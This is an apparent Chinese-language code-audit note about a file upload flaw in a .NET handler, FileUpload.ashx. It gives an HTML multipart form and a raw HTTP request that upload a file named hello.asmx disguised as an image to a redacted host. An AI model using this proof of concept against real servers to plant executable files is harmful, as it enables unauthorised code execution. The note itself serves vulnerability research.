拿到源码的时候发现有混淆<br />![46cb1c2b4bd476cf95ad0fe6621fc8f.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1672928225464-7c8fcf74-10ad-4d48-9263-f0e1b74e47a1.png#averageHue=%2321201f&clientId=ucf6fbb0e-5732-4&from=paste&height=496&id=ub1b76edb&originHeight=620&originWidth=1033&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75466&status=done&style=none&taskId=ud3496b1c-deca-4f7c-ac17-16400c300aa&title=&width=826.4)<br />用这个去混淆<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1672928183886-f75d3ede-1a94-4039-a3b1-d534803a8657.png#averageHue=%2304285b&clientId=ucf6fbb0e-5732-4&from=paste&height=38&id=u4da03087&originHeight=48&originWidth=760&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8012&status=done&style=none&taskId=ub6caccf4-78b9-459d-9871-83b15b798be&title=&width=608)

审计的时候发现碰到了这个坑，context.Request.Files.Count.Equals(0)，导致我包构造的时候，无法摆脱逻辑<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1672762644951-6b062fce-193d-4442-a6b5-096bfd9ac649.png#averageHue=%23222120&clientId=u9aed601e-bc18-4&from=paste&height=228&id=ua44aa3d8&originHeight=285&originWidth=853&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41931&status=done&style=none&taskId=ud2145e0e-e4d5-44f9-acc3-8613ef5ffb8&title=&width=682.4)<br />连postman也搞不定<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1672762797945-4290311b-541e-4e58-a8b1-90443954a8bb.png#averageHue=%23fbfafa&clientId=u9aed601e-bc18-4&from=paste&height=490&id=uabb22237&originHeight=612&originWidth=732&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43257&status=done&style=none&taskId=u6f308839-af8c-4ebb-9891-11462a352e6&title=&width=585.6)

最后是百度找了个前端代码，enctype="multipart/form-data"，成功解决问题
```
<form action="http://xxxx/Ajax/FileUpload.ashx?name=1.png" method="post" enctype="multipart/form-data" >
　　　<input type="file" id="file" name="upload" /> <br />
　　　<input type="submit" value="Upload" />
</form>
```

![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1672762872390-d9a93024-eeda-4e12-a51a-205d988b1e27.png#averageHue=%23faf9f9&clientId=u9aed601e-bc18-4&from=paste&height=365&id=u1e7ac413&originHeight=456&originWidth=1288&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22847&status=done&style=none&taskId=ue979d12c-e88d-4483-9c19-19191cef0e7&title=&width=1030.4)

对应的请求包
```
POST /Ajax/FileUpload.ashx?name=1.png HTTP/1.1
Host: xxx:8008
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------33169903223329083827993860364
Content-Length: 223
Origin: null
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------33169903223329083827993860364
Content-Disposition: form-data; name="file"; filename="hello.asmx"
Content-Type: image/jpeg

123
-----------------------------33169903223329083827993860364--

```
